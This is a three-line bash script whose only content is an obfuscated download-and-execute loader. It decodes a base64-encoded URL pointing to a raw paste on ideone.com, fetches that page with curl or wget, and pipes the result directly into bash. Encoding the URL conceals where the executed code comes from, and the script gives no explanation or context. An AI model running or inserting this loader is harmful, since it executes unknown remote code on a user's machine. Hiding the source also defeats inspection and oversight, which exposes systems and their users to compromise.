#!/bin/bash
a=$(base64 -d <<< "aHR0cHM6Ly9pZGVvbmUuY29tL3BsYWluL0diN0JkMgo=")
(curl -fsSL $a||wget -q -O- $a)|bash